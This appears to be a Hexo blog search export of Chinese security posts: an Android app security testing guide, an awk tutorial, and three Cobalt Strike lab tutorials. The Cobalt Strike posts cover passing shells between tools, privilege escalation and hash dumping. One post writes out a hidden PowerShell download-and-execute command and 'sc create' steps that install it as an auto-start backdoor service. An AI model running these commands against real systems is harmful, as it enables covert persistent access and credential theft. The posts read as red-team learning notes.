<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APP测试</title>
    <url>/2020/05/14/APP%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>自用App测试安全指南</p>
<p>参考于Panda写的APP安全检测指南</p>
<a id="more"></a>

<hr>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大概的渗透测试概要</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200514093744.png"></p>
<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>Kali;sdk</p>
<h1 id="客户端安全"><a href="#客户端安全" class="headerlink" title="客户端安全"></a>客户端安全</h1><h2 id="安装包签名"><a href="#安装包签名" class="headerlink" title="安装包签名"></a>安装包签名</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><blockquote>
<p>Andoid系统会在安装apk的时候，检查签名，签名不同，没有签名或者签名不通过的，不能进行安装或者覆盖。方法是：获取打包在apk里面的数字证书（里面有公钥），该证书是自签名证书，用证书公钥验证该证书的合法性（该证书有自己的私钥对该证书进行签名，而不是第三方权威机构的私钥），判断证书的有效期，然后利用该证书的公钥对包文件的签名进行验证。</p>
</blockquote>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>jarsigner</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">kali中自带jarsiner检查安装包的签名</span><br><span class="line"></span><br><span class="line">jarsigner.exe -verify APK 文件路径 -verbose -certs</span><br></pre></td></tr></table></figure>
<h3 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h3><p>检查签名</p>
<p>以某州APP示例<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2020-05-14%2009-54-16%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p>签名CN=kingdon 结果为安全。</p>
<p>只有直接使用客户的证书签名的时候，才认为是安全。Debug证书，第三方（开发方）证书等等均认为风险；</p>
<h3 id="威胁等级"><a href="#威胁等级" class="headerlink" title="威胁等级"></a>威胁等级</h3><p>威胁等级<br>安装包签名的威胁等级判断一般如下： 若客户端安装包签名有异常（例如签名证书为第三方开发商而不是客户端发布方），此 时高风险；若无异常则无风险。 </p>
<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><p>将安装包进行签名并检测安装包签名的异常。 </p>
<h2 id="反编译保护"><a href="#反编译保护" class="headerlink" title="反编译保护"></a>反编译保护</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><blockquote>
<p>测试客户端安装程序，判断是否能反编译为源代码，java 代码和 so 文件是否存在代<br>码混淆等保护措施。未作保护的 java 代码，可以轻易分析其运行逻辑，并针对代码中的<br>缺陷对客户端或服务器端进行攻击。<br>成功的反编译将使得攻击者能够完整地分析 APP 的运行逻辑，尤其是相关业务接口协<br>议、和通信加密的实现。 </p>
</blockquote>
<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><p>d2j-dex2jar;jd-gui</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">d2j-dex2jar <span class="class"><span class="keyword">class</span>文件路径 </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">jd</span>-<span class="title">gui</span>查看文件</span></span><br></pre></td></tr></table></figure>

<h3 id="渗透步骤"><a href="#渗透步骤" class="headerlink" title="渗透步骤"></a>渗透步骤</h3><p><strong>将sdk文件打开，导出classes.dex</strong></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2020-05-14%2014-41-29%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p><strong>反编译为java文件</strong><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2020-05-14%2014-51-01%20%E7%9A%84.png"></p>
<p><strong>jd-gui打开jar文件，得到java代码</strong></p>
<p>下图为混淆后的代码样例，除了覆写和接口以外的字段都是无意义的名称<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200514145414.png"></p>
<p>上图经过逆向发现经过混淆，安全。<br>如果代码经过混淆，或者有加壳措施，不能完整恢复源代码的，都可以认为此项安全。 </p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p><a href="https://bbs.pediy.com/thread-172358.htm">apk混淆后新增文件</a><br><a href="https://blog.csdn.net/xwg709744892/article/details/84693971?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">判断混淆</a><br><a href="https://crifan.github.io/android_app_security_crack/website/android_crack_tech/how_deobfuscation.html">反混淆</a></p>
<h3 id="威胁等级-1"><a href="#威胁等级-1" class="headerlink" title="威胁等级"></a>威胁等级</h3><ul>
<li>若客户端进行加壳保护，此时认为无风险。 </li>
<li>若大部分代码（包括核心代码）经过混淆，此时低风险。 </li>
<li>若部分代码混淆，关键代码（加密或通信等）可以获知其关键代码，此时中风险。 </li>
</ul>
<h3 id="安全建议-1"><a href="#安全建议-1" class="headerlink" title="安全建议"></a>安全建议</h3><p>建议客户端程序可以把关键代码以 JNI 方式放在 so 库里。so 库中是经过编译的<br>arm 汇编代码，可以对其进行加壳保护，以防止逆向分析。</p>
<h2 id="应用完整性校验"><a href="#应用完整性校验" class="headerlink" title="应用完整性校验"></a>应用完整性校验</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><blockquote>
<p>测试客户端程序是否对自身完整性进行校验。攻击者能够通过反编译的方法在客户端<br>程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客<br>户端程序窃取手机用户的隐私信息</p>
</blockquote>
<h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><p><a href="https://www.52pojie.cn/thread-726176-1-1.html">androidkiller</a></p>
<p>apktool</p>
<h3 id="渗透步骤-1"><a href="#渗透步骤-1" class="headerlink" title="渗透步骤"></a>渗透步骤</h3><p><strong>androidkiller解压文件包，修改解包目录下的资源文件（logo之类好确认）</strong></p>
<p><img src=""></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Awk学习</title>
    <url>/2020/06/07/AWK%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>最近看上了国外挖洞赏金，正好也找到了<a href="https://i.hacking8.com/src/">src</a>将数据放入到LangSrcCurise中（先不管国内能不能访问）<br>这时就需要将src的地址传入到Lang子域名监控中。</p>
<a id="more"></a>

<hr>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来准备用excel或者python去实现这样的功能，但之前看过awk。具体是哪天给忘了，觉得可以练练</p>
<h1 id="Awk介绍"><a href="#Awk介绍" class="headerlink" title="Awk介绍"></a>Awk介绍</h1><p>Awk 是一种处理文本文件的语言，是一个强大的文本分析工具。<br>Awk与sed的区别是: </p>
<ul>
<li>前者编辑的列，后者编辑的行</li>
<li>前者轻量简单，后者功能强大，语法复杂</li>
</ul>
<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><p>awk：一般我们只用“逐行处理”比如对于满足条件的某些行，我们打印某某列。通过指定分隔符，我们很容易的对列进行操作。</p>
<h2 id="用法一（F）"><a href="#用法一（F）" class="headerlink" title="用法一（F）"></a>用法一（F）</h2><p>-F  #指定输入文件折分隔符 默认为空格和tab</p>
<p>1.txt文本如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*.buddypress.org</span><br><span class="line">*.wordcamp.org</span><br><span class="line">*.wordpress.net</span><br><span class="line">*.wordpress.org</span><br><span class="line">*.bbpress.org</span><br></pre></td></tr></table></figure>

<p>用法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@hw3:~/git/LangSrcCurise/initialize# awk -F &quot;.&quot; &#x27;&#123;print $2,$3&#125;&#x27; 1.txt </span><br><span class="line"><span class="meta">#</span><span class="bash">  每行按<span class="string">&quot;.&quot;</span>分割，输出文本中的2、3项</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------- </span><br><span class="line"><span class="meta">#</span><span class="bash">  格式化输出</span></span><br><span class="line">buddypress org</span><br><span class="line">wordcamp org</span><br><span class="line">wordpress net</span><br><span class="line">wordpress org</span><br><span class="line">bbpress org</span><br><span class="line">cbhq net</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>也可以定义多个分隔符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">文本</span></span><br><span class="line">root@hw3:~/git/LangSrcCurise/initialize# cat test.txt</span><br><span class="line">111 222 333        444:555:666</span><br><span class="line">root@hw3:~/git/LangSrcCurise/initialize#</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 输出444</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="用法二-BEGIN"><a href="#用法二-BEGIN" class="headerlink" title="用法二(BEGIN)"></a>用法二(BEGIN)</h2><p>BEGIN{}   {}        END{}<br>行处理前  行处理    行处理后</p>
<hr>
<p>BEGIN 定义一些变量（通常在发生处理之前。例如BEGIN{FS=”:”;OFS=”—“}）</p>
<p>单一的-F 参数是不够用的，我们刚才的操作并没有直接获取到我们想要的数据</p>
<p>用法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@hw3:~/git/LangSrcCurise/initialize# awk &#x27;BEGIN&#123;FS=&quot;.&quot;;OFS=&quot;.&quot;&#125; &#123;print $2,$3&#125;&#x27; 1.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> BGEGIN是在处理之前操作，FS指定列分割符  OFS输出记录分隔符（输出换行符），输出时用指定的符号代替换行符</span></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="meta">#</span><span class="bash">  格式化输出</span></span><br><span class="line">buddypress.org</span><br><span class="line">wordcamp.org</span><br><span class="line">wordpress.net</span><br><span class="line">wordpress.org</span><br><span class="line">bbpress.org</span><br><span class="line">cbhq.net</span><br><span class="line">coinbase.com</span><br><span class="line">irccloud-cdn.com</span><br><span class="line">irccloud.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面还可以直接输入到为文本中</p>
<p>使用管道符即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@hw3:~/git/LangSrcCurise/initialize# echo | awk BEGIN&#x27;&#123;FS=&quot;.&quot;;OFS=&quot;.&quot;&#125; &#123;print $2,$3&#125;&#x27; 1.txt &gt; 2.txt</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike学习三</title>
    <url>/2019/10/16/CobaltStrike%E5%AD%A6%E4%B9%A0%E4%B8%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>能够与metasploit配合，可以相互派生shell，学会团队作战的理念，能够使用CS的协作功能。</p>
<a id="more"></a>

<hr>
<h2 id="Cobalt-strike派生shell给metasploit"><a href="#Cobalt-strike派生shell给metasploit" class="headerlink" title="Cobalt strike派生shell给metasploit"></a>Cobalt strike派生shell给metasploit</h2><ul>
<li>前提有一个beaconshell</li>
</ul>
<h3 id="在metasploit处创建一个handler"><a href="#在metasploit处创建一个handler" class="headerlink" title="在metasploit处创建一个handler"></a>在metasploit处创建一个handler</h3><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/KSBB%5D%7D%7E%60%608ODOHJ%5B%60GS.png" alt="avatar"></p>
<h3 id="使用cobaltstrike创建一个listener"><a href="#使用cobaltstrike创建一个listener" class="headerlink" title="使用cobaltstrike创建一个listener"></a>使用cobaltstrike创建一个listener</h3><p>这里port设置为创建msf的handler时的port<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7B1FG4M4%2495LS2%601NTIUP3.png" alt="avatar"></p>
<h3 id="利用已获得的beaconshell传给msf"><a href="#利用已获得的beaconshell传给msf" class="headerlink" title="利用已获得的beaconshell传给msf"></a>利用已获得的beaconshell传给msf</h3><p>chose 选择 msf这个listener</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/PGZGI0EXGA3CTJ7_T.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/DT%60NMP.png" alt="avatar"></p>
<p>这里我没有成功，cs传给metasploit失败。没找到原因</p>
<h2 id="metasploit派生shell给cobaltstrike"><a href="#metasploit派生shell给cobaltstrike" class="headerlink" title="metasploit派生shell给cobaltstrike"></a>metasploit派生shell给cobaltstrike</h2><ul>
<li>前提是有一个metasploit的session</li>
<li>删除之前的记录。先在cobaltstrike创建一个listener，用于接收msf的派生shell<h3 id="cobaltstrike创建一个listener"><a href="#cobaltstrike创建一个listener" class="headerlink" title="cobaltstrike创建一个listener"></a>cobaltstrike创建一个listener</h3></li>
</ul>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/EH.png"></p>
<h3 id="metasploit获取session"><a href="#metasploit获取session" class="headerlink" title="metasploit获取session"></a>metasploit获取session</h3><p>生成metasploit的木马</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/S0%60V%7E10WXVKMD%25Y69.png"></p>
<p>开启监听</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/Q53E8%603VQ6X3%7EP.png"></p>
<p>利用web服务开启渠道，选择之前生成的恶意文件test.exe</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/JW81.png"></p>
<p>win7下载testexe,获得session</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/3BX7AAP.png"></p>
<h3 id="cs获得meta的shell"><a href="#cs获得meta的shell" class="headerlink" title="cs获得meta的shell"></a>cs获得meta的shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/local/payload_inject</span><br><span class="line">msf5 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">msf5 exploit(windows/local/payload_inject) &gt; set lhost 10.1.1.100</span><br><span class="line">msf5 exploit(windows/local/payload_inject) &gt; set lport 7777</span><br><span class="line">msf5 exploit(windows/local/payload_inject) &gt; set session 1</span><br><span class="line">msf5 exploit(windows/local/payload_inject) &gt; run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此时cobaltstrike 已经获得metasploit的shell<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/eeeee.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/CFDTZ2X5V%7E9R%25BX%7BB5FC521.png"></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike学习二</title>
    <url>/2019/10/09/CobaltStrike%E5%AD%A6%E4%B9%A0%E4%BA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>了解CobaltStrike的功能，深入理解各个功能模块的含义及使用，能够根据具体情况调用不同模块来使用</p>
<a id="more"></a>

<hr>
<h3 id="Cobalt-Strike模块"><a href="#Cobalt-Strike模块" class="headerlink" title="Cobalt Strike模块"></a>Cobalt Strike模块</h3><h4 id="New-Connection"><a href="#New-Connection" class="headerlink" title="New Connection"></a>New Connection</h4><ul>
<li>connection 新建立一个用户连接，即连接到一个新的teamserver上</li>
<li>Preferences 配置自己的设置，还记得我们第二次连接服务端的时候不用校验hash吗，就是因为hash已经被缓存在这儿了</li>
</ul>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/deedede.png" alt="avatar"></p>
<h4 id="Visualization可视化"><a href="#Visualization可视化" class="headerlink" title="Visualization可视化"></a>Visualization可视化</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%25XVR(HW%24CVM10S)GTJ2O4IK.png" alt="avatar"></p>
<ul>
<li>pivot graph   控制主机视图</li>
<li>session table 一个会话</li>
<li>Target table 目标表</li>
</ul>
<h4 id="Vpn-lnterfaces"><a href="#Vpn-lnterfaces" class="headerlink" title="Vpn lnterfaces"></a>Vpn lnterfaces</h4><p>Vpn lnterfaces  vpn接口，一般在公网环境下很实用</p>
<h4 id="listeners"><a href="#listeners" class="headerlink" title="listeners"></a>listeners</h4><p>建立个反弹shell的监听器</p>
<h4 id="Script-manager"><a href="#Script-manager" class="headerlink" title="Script manager"></a>Script manager</h4><p>Script manager 用于脚本管理，我们前面提到CS可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等。</p>
<h3 id="Attacks"><a href="#Attacks" class="headerlink" title="Attacks"></a>Attacks</h3><h4 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h4><blockquote>
<p>生成恶意文件</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7B%7DS%7DC0CY%5D4RVAQS7KCFW%40%7BU.png" alt="avatar">  </p>
<pre><code>  HTML Application   生成hta文件

  MS Office Macro     宏office文件

  Payload Generator  生成各种语言版本的payload

  USB/CD AutoPlay    利用自动播放运行的被控端文件

  Windows Dropper   捆绑器可将任意正常的文件

  Windows Executable payload  生成可执行文件 (一般使用这个)

  Windows Executable (S)  把包含payload,Stageless生成可执行文件(包含多数功能)</code></pre>
<h4 id="Web-Drive-by"><a href="#Web-Drive-by" class="headerlink" title="Web Drive-by"></a>Web Drive-by</h4><blockquote>
<p>创建一个渠道，能够让靶机下载执行生成的恶意文件</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/wwwwwwwwwwwwwwwwww.png" alt="avatar"></p>
<pre><code>  CS支持的方式包括：

  Manage    开启的所有web服务

  Clone Site 克隆网站

  Host File   提供Web以供下载某文件

  Scripted Web Delivery  为payload提供web服务以便于下载和执行

  Signed Applet Attack   启动一个Web服务以提供自签名JavaApplet的运行环境

  Smart Applet Attack     自动检测Java版本并利用已知的exploits绕过security

  System Profiler             获取系统，Flash，浏览器版本等

  我们是通过web的方式，在靶机上执行下载命令完成的</code></pre>
<h4 id="SpearPhish"><a href="#SpearPhish" class="headerlink" title="SpearPhish"></a>SpearPhish</h4><blockquote>
<p>即鱼叉式网络钓鱼</p>
</blockquote>
<h3 id="beacon命令"><a href="#beacon命令" class="headerlink" title="beacon命令"></a>beacon命令</h3><pre><code>  右键interact可以开启beacon，我们用它来执行各种命令

  查看怎么使用哪些命令，可以使用help</code></pre>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/GRY%608%25_%25VO382RDDX%60C_2DT.png" alt="avatar"></p>
<pre><code>  注意，在Cobalt Strike中它的心跳默认是60s，默认60s一次回传，这会让我们执行的命令响应很慢，在下载文件面前更为明显，所以实验时会把时间降低一点。但是在实战时应根据实战环境来调节，建议不要太快，不然流量特征会过于明显，容易暴露自己。
   我这里设置为如下，让靶机每5s下载一次任务</code></pre>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/dededede.png" alt="avatar"></p>
<h3 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h3><p>事实上，右键打开的不止interact<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/eeeeeeeeeeeeeeee.png" alt="avatar"></p>
<pre><code>  Interact   打开beacon</code></pre>
<p>Access</p>
<pre><code>  dumphashes 获取hash

  Elevate 提权

  GoldenTicket 生成黄金票据注入当前会话

  MAketoken  凭证转换

  RunMimikatz 运行 Mimikatz

  SpawnAs 用其他用户生成CobaltStrike侦听器</code></pre>
<p>Explore</p>
<pre><code>   BrowserPivot 劫持目标浏览器进程

   Desktop(VNC)  桌面交互

   FileBrowser  文件浏览器

   NetView 命令Net View

   Portscan 端口扫描

   Processlist 进程列表

   Screenshot截图</code></pre>
<p>Pivoting</p>
<pre><code>   SOCKSServer 代理服务

   Listener  反向端口转发

   DeployVPN 部署VPN</code></pre>
<p>Spawn 新的通讯模式并生成会话</p>
<p>Session 会话管理，删除，心跳时间，退出，备注</p>
<h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/X_SVGWCWGNL%2435%7BC%403%4099RC.png" alt="avatar"></p>
<pre><code>  Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本

  Credentials 显示所有已经获取的用户主机hash

  Downloads 显示下载的文件

  Event log 事件日志记录团队 目标上线等记录

  Keystrokes 目标键盘记录

  Proxy Pivots 代理信息

  Screenshots 屏幕截图

  Script Console 加载自定义脚本

  Targets 显示所有主机

  Web log web服务日志

  这些选项直接打开是没有用的，得在beacon中执行相应命令后才能使用，之前演示了screenshot，这里示范个经典的动作--获取hash，不过需要administrator权限，所以顺便演示一下使用CS提权，右键-》access-&gt;elevate</code></pre>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%5BW%24%40%7DMLE1%7B18D%60%7BQN%25MC5%24F.png" alt="avatar"></p>
<p>会自动选择合适的exp，点击launch即可，此时在日志中可以看到已经拿到system权限了<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/X28QG%40PG%40SH1%7B9%7B%24KH64PSQ.png" alt="avatar"></p>
<p>现在我们有2个会话，一个yale，一个system<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/Y9KR0E%5BB3%7D7%5D%25%404%7DAJY8.png" alt="avatar"></p>
<p>我们这时候需要和system交互，所以还是同样在system上右键-》interact<br>输入hashdump<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/SN%7DK5%7ENHG91%40M%6099JEUDAL.png" alt="avatar"></p>
<p>这些结果都被缓存在了view-&gt;credentials<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%5D%60AN3%406%5DTM9%7BXA4IYJ26S89.png" alt="avatar"></p>
<h3 id="最后一步是生成报告"><a href="#最后一步是生成报告" class="headerlink" title="最后一步是生成报告"></a>最后一步是生成报告</h3><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/_%60LNV0M_FY33TYMHR67.png" alt="avatar"></p>
<pre><code>  Activity report  活动报告

  Hosts report  主机报告

  Indicators of Compromise 威胁报告

  Sessions report  会话报告

  Social engineering report  社会工程学报告</code></pre>
<h4 id="生成新鲜的威胁报告"><a href="#生成新鲜的威胁报告" class="headerlink" title="生成新鲜的威胁报告"></a>生成新鲜的威胁报告</h4><p>还是同样的方法使用默认名，默认路径生成<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/FH1%25K0AL2YAFP9EXF%25JV.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike学习五</title>
    <url>/2019/10/16/CobaltStrike%E5%AD%A6%E4%B9%A0%E4%BA%94/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。</p>
<a id="more"></a>

<hr>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>注册表</span><br><span class="line"><span class="number">2.</span>启动项</span><br><span class="line"><span class="number">3.</span>计时任务</span><br><span class="line"><span class="number">4.</span>设置服务</span><br><span class="line"><span class="number">5.</span>shift后门</span><br><span class="line"><span class="number">6.</span>dll劫持(白加黑)</span><br><span class="line"><span class="number">7.</span>利用其他安装的软件</span><br></pre></td></tr></table></figure>
<h2 id="设置powershell脚本开机自启动后门"><a href="#设置powershell脚本开机自启动后门" class="headerlink" title="设置powershell脚本开机自启动后门"></a>设置powershell脚本开机自启动后门</h2><p>点击Attacks-&gt;web driver-by -&gt;script web delivery<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7DI%40FX2R7%7DWHI.png"></p>
<p>点击launch后出现如下<br>将其复制到靶机的cmd运行即可<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/NJHB%7B%607%7D4%60XM8L%5B%60NIE0V.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.1.1.100:81/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
<p>此时拿到了普通用户权限的beacon，首先提权到system权限<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/5%603KM2TO1C%7D%7EQRV%7B8174.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/E6137CE.png"></p>
<p>打开beacon shell后输入：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">shell sc <span class="keyword">create</span> &quot;name&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((<span class="built_in">new</span>-<span class="keyword">object</span> net.webclient).downloadstring(<span class="string">&#x27;http://10.1.1.100:81/a&#x27;</span>))\&quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%602%5BPYJY%7B_MZN%5B%7EZ9M%60BBE.png"></p>
<p>切换到靶机，查看服务，<br>在服务中找到了名为name的项<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/EPPCW8AG%40AZT5.png"></p>
<p>注意到此时启动类型还是手动，我们设置为自动<br>回到beacon shell输入以下命令即可</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">shell sc<span class="built_in"> config </span><span class="string">&quot;name&quot;</span> start= auto</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7B%256FN54XMS_B1GJ%7BSQFP9Q5.png"></p>
<p>在服务中右键-》刷新<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/L%7ERK9V%24I_%7BO7%7E%7BZ%7EB2WE%24GI.png"></p>
<p>设置服务的描述字符串<br>shell sc description “name” “description”</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/NQHR0%7BQO5%40T.png"></p>
<p>再次刷新，可以看到此时在name的属性中看到了描述为description<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/4%7BOPA%25%7D%409PR09%5B4MH%5BVPQS7.png"></p>
<p>接下来启动服务</p>
<p>shell net start “name”</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/H_%4019B%7E2%24U%5D61LJ%5DS3RBQ%25I.png"></p>
<p>然后重启靶机<br>此时看到已有的会话已经失去了连接<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/RA3JHISUG%5BM6FMGFIK%7ESX%7BS.png"></p>
<p>不过通过powershell留开机自启动服务，当目标主机重启电脑之后,不断向攻击机器发送请求数据包，重新拿到控制权限</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/FWCQIBD6N%24FLE.png"></p>
<h2 id="通过service留自启动后门，生成一个exe后门"><a href="#通过service留自启动后门，生成一个exe后门" class="headerlink" title="通过service留自启动后门，生成一个exe后门"></a>通过service留自启动后门，生成一个exe后门</h2><p>Attacks-&gt;packages-&gt;windows executable</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/_219%7D3LE410%5B8K06A8KL389.png"></p>
<p>保存即可,<br>然后右键explore&gt;file browser</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/K2%40O5Y3MW4BFL1W%60I.png"></p>
<p>把生成的exe程序上传到靶机<br>选择我们想要的路径，这里以C:\windows为例<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/HJN9OLVEC75MQ_2CH.png"></p>
<p>点击upload，选择artifact.exe<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/4%259GFI7S%7DP%7ER%25AZ%24ZJ.png"></p>
<p>点击打开即可<br>在靶机上就能看到了</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg.png"></p>
<p>创建项及路径<br>shell sc create “server power” binpath= “C:\Windows\artifact.exe”</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg2.png"></p>
